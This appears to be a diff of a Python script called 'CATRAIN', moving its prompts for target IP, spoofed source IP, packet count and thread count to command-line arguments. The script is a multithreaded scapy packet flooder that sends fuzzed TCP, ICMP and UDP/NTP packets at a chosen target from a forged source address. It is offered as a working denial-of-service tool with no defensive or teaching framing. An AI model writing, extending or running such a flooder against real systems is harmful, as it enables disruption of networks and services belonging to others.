@@ -1,28 +1,39 @@
+from argparse import ArgumentParser as AP 
+
 print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 
 
-import subprocess as s; from threading import Thread; from time import sleep, time; from os import name as osname; from re import search; from sys import exit as sex; 
-
-starttime=time() 
+import subprocess as s; from sys import exit as sex 
 
 try:
 	if b"scapy" not in s.check_output("pip list", shell=True):
 		s.call("pip install scapy", shell=True) 
 finally: 0 
 
-target_ip = str(); count = int(); srcIp = str(); threadcount = str(); showp = str() 
-try:
-	target_ip = input("\t\t\t      IP: ") 
-	count = int(input("Packet run count (3 packets per): ")) 
-	srcIp = input("    Source IP (def: 192.168.1.2): ") 
-	threadcount = int(input("\t\t    Thread count: ")) 
-	showp = input("\t Show ping (y/n)(def: y): ") 
-except Exception: input("\n type more carefully ffs. "); sex() 
+import argparse as AP
 
-if not srcIp: srcIp = "192.168.1.2" 
-if not showp: showp = "y" 
+def get_args():
+	parser = AP.ArgumentParser(description="Catrain by Queen, Lmaos :3") 
+	parser.add_argument("-i", "--ip", type=str, nargs='?', help="Target IP address") 
+	parser.add_argument("-c", "--count", type=int, help="Packet run count (3 packets per run)") 
+	parser.add_argument("-s", "--src-ip", type=str, help="Source IP (default: 192.168.1.2)") 
+	parser.add_argument("-t", "--threadcount", type=int, help="Thread count") 
+	parser.add_argument("-p", "--showping", type=str, choices=['y', 'n'], help="Show ping (y/n, default: y)") 
+	return parser.parse_args() 
 
-rno = [True] * threadcount 
-rcount = [0] * threadcount 
+if __name__ == "__main__":
+	try:
+		args = get_args() 
+		if not args.ip: target_ip = input("\t\t\t      IP: ") 
+		else: target_ip = args.ip 
+		if args.count is None: count = int(input("Packet run count (3 packets per): ")) 
+		else: count = args.count 
+		if args.threadcount is None: threadcount = int(input("\t\t    Thread count: ")) 
+		else: threadcount = args.threadcount 
+		srcIp = args.src_ip if args.src_ip else "192.168.1.2"; showp = args.showping if args.showping else "y" 
+	except Exception as e: print(f"\nError: {str(e)}. Type more carefully ffs."); sex() 
+
+
+rno = [True] * threadcount; rcount = [0] * threadcount 
 
 from scapy.all import IP, TCP, ICMP, UDP, NTP, send, fuzz 
 
@@ -34,6 +45,10 @@ def scr(number):
 		send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
 		rcount[number] += 1 
 	rno[number] = False 
+
+from threading import Thread; from time import sleep, time; from os import name as osname; from re import search 
+
+starttime=time() 
 
 threads = [] 
 for x in range(threadcount):
